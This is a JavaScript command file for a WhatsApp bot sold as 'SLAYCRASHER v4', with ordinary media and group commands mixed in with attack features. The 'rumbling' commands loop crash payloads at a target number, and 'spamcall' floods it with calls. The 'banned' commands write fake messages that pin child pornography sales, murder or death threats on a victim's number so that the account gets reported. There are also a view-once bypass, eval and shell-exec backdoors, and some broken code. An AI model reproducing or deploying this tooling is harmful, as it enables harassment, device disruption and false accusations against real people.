case "readvo":
case "readviewonce":
case "readviewoncemessage": {
  // Check if the message is a reply
  if (!m.quoted) return ReplyRyc("Please reply to a message you want to view.");

  // Check if the quoted message is a view-once message
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") {
    return ReplyRyc("This is not a view-once message.");
  }

  // Extract the quoted message
  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];
  
  // Supported message types
  const supportedTypes = ["imageMessage", "videoMessage", "documentMessage", "stickerMessage", "audioMessage"];
  
  // Check if the quoted message type is supported
  if (!supportedTypes.includes(type)) {
    return ReplyRyc("The quoted message type is not supported.");
  }

  try {
    // Download the content from the quoted message
    let media = await downloadContentFromMessage(msg[type], type === "audioMessage" ? "audio" : type.replace("Message", ""));
    
    // Prepare buffer array to store media
    let bufferArray = [];
    for await (const chunk of media) {
      bufferArray.push(chunk);
    }
    let buffer = Buffer.concat(bufferArray);

    // Send the media based on the type
    if (type === "videoMessage") {
      await Ryc.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
    } else if (type === "imageMessage") {
      await Ryc.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
    } else if (type === "documentMessage") {
      await Ryc.sendMessage(m.chat, { document: buffer, mimetype: msg[type].mimetype, fileName: msg[type].fileName || "file" });
    } else if (type === "stickerMessage") {
      await Ryc.sendMessage(m.chat, { sticker: buffer });
    } else if (type === "audioMessage") {
      let isVoiceNote = msg[type].ptt || true;
      await Ryc.sendMessage(m.chat, { audio: buffer, mimetype: msg[type].mimetype, ptt: isVoiceNote });
    }

    // React with success checkmark
    await Ryc.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

  } catch (error) {
    // Error handling
    console.error("Error processing the view-once message:", error);
    ReplyRyc("Failed to process the view-once message.");
  }
}
break;

case "setpp": {
    if (!CreatorOnly) return ReplyRyc("*You're not my owner*");
    if (!quoted) return ReplyRyc(`Send Image / Reply`);
    try {
        let mime = quoted.message?.imageMessage?.mimetype || quoted.mimetype || "";
        if (!mime.startsWith("image/")) return ReplyRyc(`Bukan gambar, nih!`);
        if (/webp/.test(mime)) return ReplyRyc(`Sini muka lu ku tempelin stiker anjg!`);
        let media = await Ryc.downloadMediaMessage(quoted);
        if (!media) return ReplyRyc(`Gagal mengunduh gambar, coba lagi!`);
        await Ryc.updateProfilePicture(BotNum, media);
        ReplyRyc(`Success! Profile updated`);
    } catch (error) {
        console.error(error);
        ReplyRyc(`Aduhh, error nih 🥺: ${error}`);
    }
    }
    break;
    
//END
//DELETE PP CASE

case "delpp": {
  // Check if the user is the creator
  if (!CreatorOnly) {
    return ReplyRyc("*You are not my owner*");
  }

  try {
    // Remove the profile picture
    await Ryc.removeProfilePicture(Ryc.user.id);

    // Respond with success message
    ReplyRyc("Successfully deleted profile picture.");

  } catch (error) {
    // Handle any errors that occur during the process
    console.error("Error deleting profile picture:", error);
    ReplyRyc("An error occurred while deleting the profile picture.");
  }
}
break;

case 'tovn': {
  // Check if the quoted media is a video or audio
  if (!/video/.test(mime) && !/audio/.test(mime)) {
    return ReplyRyc(`Reply with a video or voice note and caption it with ${prefix + command}`);
  }

  // Ensure that the message is quoted
  if (!quoted) {
    return ReplyRyc(`Reply with video or voice note and caption it with ${prefix + command}`);
  }

  try {
    // Download the quoted media
    let media = await quoted.download();

    // Import the toAudio function
    let { toAudio } = require('../System/Data4');

    // Convert the media to audio
    let audio = await toAudio(media, 'mp4');

    // Send the audio as a voice note
    await Ryc.sendMessage(m.chat, { 
      audio, 
      mimetype: 'audio/mpeg', 
      ptt: true 
    }, { quoted: lol });

  } catch (error) {
    console.error('Error processing media:', error);
    ReplyRyc("An error occurred while converting the media.");
  }
}
break;

case 'tagall':{
        if (!CreatorOnly) return ReplyRyc("*fitur khusus zalldev*");
        if (!m.isGroup) return reply(mess.group);

        const textMessage = args.join(" ") || "kosong";
        let teks = `pesan tagall :\n> *${textMessage}*\n\n`;

        const groupMetadata = await Ryc.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        for (let mem of participants) {
            teks += `@${mem.id.split("@")[0]}\n`;
        }

        Ryc.sendMessage(m.chat, {
            text: teks,
            mentions: participants.map((a) => a.id)
        }, { quoted: lol });
      }
      break

case 'hidetag': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");

  let message = q ? q : '';
  let mentionedUsers = participants.map(a => a.id);

  try {
    await Ryc.sendMessage(from, { 
      text: message, 
      mentions: mentionedUsers 
    }, { quoted: lol });
    ReplyRyc("Message sent with hidden tag.");
  } catch (error) {
    console.error("Error sending message:", error);
    ReplyRyc("An error occurred while sending the message.");
  }
}
break;

case 'kick': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");
  if (!BotAdm) return ReplyRyc("*Only Bot Admins can use this command*");
  if (!Adm) return ReplyRyc("*Only Group Admins can use this command*");

  let users = m.mentionedJid[0] 
    ? m.mentionedJid[0] 
    : m.quoted 
    ? m.quoted.sender 
    : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  if (!q) return ReplyRyc("Please mention a user or send their number.");

  try {
    await Ryc.groupParticipantsUpdate(from, [users], 'remove');
    ReplyRyc("Successfully kicked the user.");
  } catch (error) {
    console.error("Error kicking user:", error);
    ReplyRyc("An error occurred while kicking the user.");
  }
}
break;

case 'getlinkgroup': 
case 'getlinkgc': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");
  if (!BotAdm) return ReplyRyc("*Only Bot Admins can use this command*");

  try {
    let responsegg = await Ryc.groupInviteCode(from);
    Ryc.sendText(
      from, 
      `https://chat.whatsapp.com/${responsegg}\n\nGroup Link: ${groupMetadata.subject}`, 
      m, 
      { detectLink: true }
    );
  } catch (error) {
    console.error("Error fetching group link:", error);
    ReplyRyc("An error occurred while fetching the group link.");
  }
}
break;

case 'resetlinkgc': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");
  if (!m.isGroup) return ReplyRyc("*This command can only be used in a group*");
  if (!BotAdm) return ReplyRyc("*Only Bot Admins can use this command*");

  Ryc.groupRevokeInvite(from);
  ReplyRyc("*Successfully reset the group invite link*");
}
break;

case 'public': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");

  Ryc.public = true;
  ReplyRyc(`*Success: Changed Mode from Self to Public*`);
}
break;

case 'self': case 'private': {
  if (!CreatorOnly) return ReplyRyc("*You're Not My Owner*");

  Ryc.public = false;
  ReplyRyc(`*Success: Changed Mode from Public to Self*`);
}
break;

case 'ocr': {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";

  if (!mime) return ReplyRyc("Send / Reply Image");
  
  if (!/image\/(jpe?g|png)/.test(mime)) {
    return ReplyRyc(`Tipe ${mime} tidak didukung!`);
  }

  let image = await q.download();
  let download = await Ryc.getFile(image, true);

  try {
    let ocr = await ocrSpace(download.filename);
    await Ryc.sendMessage(
      m.chat,
      { text: ocr.ParsedResults[0].ParsedText.trim() },
      { quoted: lol }
    );
  } catch (error) {
    console.error("OCR error:", error);
    return ReplyRyc("Gagal membaca teks dari gambar.");
  }
}
break;

case 'tourl': {
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return ReplyRyc(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return ReplyRyc('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        console.error(error);
        return ReplyRyc('Failed to download media!');
    }

    const uploadImage = require('../System/Data6');
    const uploadFile = require('../System/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;

    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        console.error(error);
        return ReplyRyc('Failed to upload media!');
    }

    Ryc.sendMessage(m.chat, {
        text: `(no expiration date/unknown)\n ${link}`
    }, { quoted: lol });
}
break;

case 'sticker':
case 's': {
    if (!quoted) return ReplyRyc(`Reply Image or Video with command ${prefix + command}`);
    
    if (/image/.test(mime)) {
        let media = await quoted.download();
        let encmedia = await Ryc.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(encmedia);
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return ReplyRyc('max 10s');
        
        let media = await quoted.download();
        let encmedia = await Ryc.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
        await fs.unlinkSync(encmedia);
    } else {
        return ReplyRyc(`Send Image or Video with command ${prefix + command}\nVideo duration only 1-9s`);
    }
}
break;

case 'brat': {
    if (!q) return ReplyRyc(`Example : Brat Brat Bret Brot`);
    
    const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`;
    await makeStickerFromUrl(imageUrl, Ryc, m);
}
break;

case "addbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return ReplyRyc("*Only In Private Chat*")
await Ryc.sendMessage(m.chat, { text: "*Silahkan Tunggu Kode Pairing Anda*" }, {})
if (m.key.fromMe) return
    try {
        await jadibot(Ryc, m, m.sender)
    } catch (error) {
        await ReplyRyc(util.format(error), command)
    }
}
break;

case "stopbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return ReplyRyc("*Only In Private Chat*")
await Ryc.sendMessage(m.chat, { text: "*Berhasil Menghapus Session!*" }, {})
    if (m.key.fromMe) return
    try {
        await stopbot(Ryc, m, m.sender)
    } catch (error) {
        await ReplyRyc(util.format(error), command)
    }
}
break;

case "listbot": {
if (!CreatorOnly && !PremOnly) return
if (m.isGroup) return ReplyRyc("*Only In Private Chat*")
    if (m.key.fromMe) return
    try {
        listbot(Ryc, m)
    } catch (error) {
        await ReplyRyc(util.format(error), command)
    }
}
break;

case 'tiktok':
case 'tt': {
    if (!qtext) return ReplyRyc(`Send command with link. ${prefix + command} https://`);
    
    let res = await tiktok(qtext);          

    if (res && res.data && res.data.data) {
        let images = res.data.data.images || [];
        let play = res.data.data.play;
        let lagu = res.data.data.music;

        const getMimeType = async (url) => {
            try {
                const response = await axios.head(url);
                return response.headers['content-type'];
            } catch (error) {
                console.error(error);
                return;
            }
        };

        let mimeType = await getMimeType(play);
            
        if (mimeType && mimeType.startsWith('video/')) {
            await Ryc.sendMessage(m.chat, {
                video: { url: play },
                caption: "Successfully downloaded video from TikTok"
            }, { quoted: lol });
        } else if (images.length > 0) {
            let totalImages = images.length;
            let estimatedTime = totalImages * 4;
            let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
            await Ryc.sendMessage(m.chat, { text: message }, { quoted: lol });

            const sendImageWithDelay = async (url, index) => {
                let caption = `Gambar ke-${index + 1}`;
                await Ryc.sendMessage(m.chat, { image: { url }, caption: caption }, { quoted: lol });
            };

            await Ryc.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" }, { quoted: lol });

            for (let i = 0; i < images.length; i++) {
                await sendImageWithDelay(images[i], i);
                await new Promise(resolve => setTimeout(resolve, 4000)); // Delay 4 seconds
            }
        } else {
            console.log('No valid video or images found.');
            await Ryc.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            }, { quoted: lol });
        }
    } else {
        console.error('Error: Invalid response structure', res);
        await Ryc.sendMessage(m.chat, {
            text: "No media found or an error occurred while retrieving media."
        }, { quoted: lol });
    }
}
break;
case 'rumbling-invis':
case 'rumbling-ui':
case 'rumbling-delay': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc(`Example:\n .${command} 22xx / @tag`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`*Syntax Erorr!!l
        \n\nExample: .${command} 224xxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Send Bug to ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 100; r++) {
    await UiCallCrashBlank(isTarget, true)
    await UiCallCrashBlank(isTarget, true) 
    await UiCallCrashBlank(isTarget, true) 
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'rumbling-freeze': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc(`Example:\n .${command} 22xx / @tag`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`*Syntax Erorr!!.\n\nExample: .${command} 224xxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Send Bug to ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 100; r++) {
    await UiCallCrashBlank(isTarget, true) 
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case "buysc": {
ReplyRyc(`SLAYCRASHER v4
Price? 10k enc 
15k no enc
efek bug? delay invisible,Fc,Ui crash
conntact
https://224620503751`);
}
break;

case "about": {
ReplyRyc(`\`[ ⩟ ] About\`
This bot was developed to help users carry out various activities, this bot also has an attack feature, so use it wisely.
Warm Greetings: Tamzz 

Social Media Creators:  
- WhatsApp : 224620503751
- Tiktok: @trafalgarsa10`)
}
break;

case 'rumbling-invis': {
if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example:\n .rumbling-invis 22xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`The number starts with '0'. Replace it with the country code number.\n\nExample: .rumbling-invis 22 xxx-xxxx-xxxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;
    
  Ryc.sendMessage(m.chat, {
  caption: `𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐅𝐎𝐑\nAttack : ${isTarget}`, 
  image: { url: "https://img1.pixhost.to/images/7850/630591351_1001781914.jpg" },
  footer: "Zall DEV",
  buttons: [
    {  
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "Select",
        "sections": [
            {
                "title": "Lets Try Sent Crash",
                "highlight_label": "",
                "rows": [
                    {
                        "header": "For Android",
                        "title": "rumbling-invis",
                        "description": "ϟ Invis ϟ ",
                        "id": ".rumbling-invis ${isTarget}"
                    },
                    {
                    header": "For Android",
                        "title": "Rumbling-ui",
                        "description": "ϟ Ui system ϟ",
                        "id": ".rumbling-ui ${isTarget}"
                    },
                    {
                    header": "For Android",
                        "title": "rumbling-delay",
                        "description": "ϟ Delay ϟ",
                        "id": ".rumbling-delay ${isTarget}"
                    },
                    {
                        "header": "For Ios",
                        "title": "rumbling-ios",
                        "description": "ϟ Ios Crash ϟ",
                        "id": ".rumbling-ios ${isTarget}"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: null });
}
break

case 'rumbling-ios': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example:\n .rumbling-ios 22xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`*Syntax Erorr!!.\n\nExample: .rumbling-ios 224xxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Send Bug to ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 15; r++) {
    await NewIos(isTraget);
    await NewIos(isTraget); 
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'banned': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example:\n .banned 22xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`*Syntax Erorr!!.\n\nExample: .banned 224xxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*📢 Pornoshop
Hallo, ich bin vom Pornografie-Team. Ich verkaufe viele pornografische Videos zu günstigen Preisen. Im Folgenden finden Sie eine Liste pornografischer Videos 👇

✅ Kid pornographique: 100 $
✅ Erwachsenenpornografie: 210 $

Befriedigen Sie Ihre Lust, indem Sie pornografische Videos kaufen, und Sie erhalten einen Rabatt, wenn Sie dreimal pornografische Videos gekauft haben 😍. Kaufen Sie sofort so viele pornografische Videos wie möglich und erhalten Sie einen Rabatt für den Kauf zu einem günstigeren Preis 🥳. Kontakt per WhatsApp 👇
https://api.whatsapp.com/send?phone= ${isTarget}`);
}
break;

case 'banned2': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example:\n .banned2 22xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`*Syntax Erorr!!.\n\nExample: .banned2 224xxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*אין זה יוצא דופן שרוצחים או עברייני מין יבצעו את פשעיהם בבתיהם, במיוחד במרתף.

רוצחים מפורסמים כמו ג'ון וויין גייסי וגארי היידניק השתמשו בבתיהם כדי לבצע ולהסתיר את הרציחות שלהם.

קריפטות אלו נבנו בקפידה מתחת לבתים ומשקפות כיצד כמה פושעים הצליחו להתחמק מגילוי המשטרה.

הפשע האחרון ברשימת הרוצחים הסדרתיים התרחש ב-2016, והמוקדם ביותר היה המקרה של HH הולמס.

H.H הולמס או הנרי הווארד הולמס היה רופא שהיה גם הרוצח הסדרתי המתועד הראשון של אמריקה בעת המודרנית.

אם ברצונך ליצור איתו קשר, אנא צור קשר עם מספר הוואטסאפ למטה

https://api.whatsapp.com/send?phone= ${isTarget}`);
}
break;

case 'banned3': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example:\n .banned3 22xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`*Syntax Erorr!!.\n\nExample: .banned3 224xxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Hello Mark Zuckerbeg👿👽, Let me introduce myself. I am one of the Mafia which is famous for its cruelty. I will kill you and be as pathetic as this photo👇🔪🔪

https://ibb.co/vYGLd2Z👻
https://ibb.co/vYGLd2Z👻

You Can't Go Anywhere I Have Detected You Anytime😈👿, If You Want To Cooperate Please Call The Following Number📞https://api.whatsapp.com/send?phone=${isTarget}`);
}
break;

case 'spamcall': {
if (!PremOnly) return 
if (!q) return ReplyRyc("Example Use.\n calloffer 22xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`*Success Send Spam Call To ${isTarget}*`)
await sleep(1000)
for (let i = 0; i < 20; i++) {
await sendOfferCall(isTarget)
await sendOfferVideoCall(isTarget)
}
}
break

case 'Rumbling-trap': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example:\n .Rumbling-trap 22xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`*Syntax Erorr!!.\n\nExample: .Rumbling-trap 224xxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Send Bug to ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 15; r++) {
    await protocolbug5(isTarget)
    await protocolbug2(isTarget)
    await protocolbug(isTarget)
    await DelayStc(Ryc, isTarget)  
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'rumbling-delay': {
    if (!PremOnly) return ReplyRyc("*You are not a Premium User*");
    if (!q) return ReplyRyc("Example:\n .rumbling-delay 22xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRyc(`*Syntax Erorr!!.\n\nExample: rumbling-delay 224xxx`);
    }

    let isTarget = `${jidx}@s.whatsapp.net`;

    ReplyRyc(`*Success! Send Bug to ${isTarget}*`);

    //Paramater
    for (let r = 0; r < 150; r++) {
    await DelayStc(Ryc, isTarget)  
    }
  console.log(chalk.red.bold("Success!"))
}
break;

//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!CreatorOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return ReplyRyc(bang)}
try {
ReplyRyc(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
ReplyRyc(String(e))}}
if (budy.startsWith('>')) {
if (!CreatorOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyRyc(evaled)
} catch (err) {
await ReplyRyc(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!CreatorOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return ReplyRyc(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
Ryc.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\
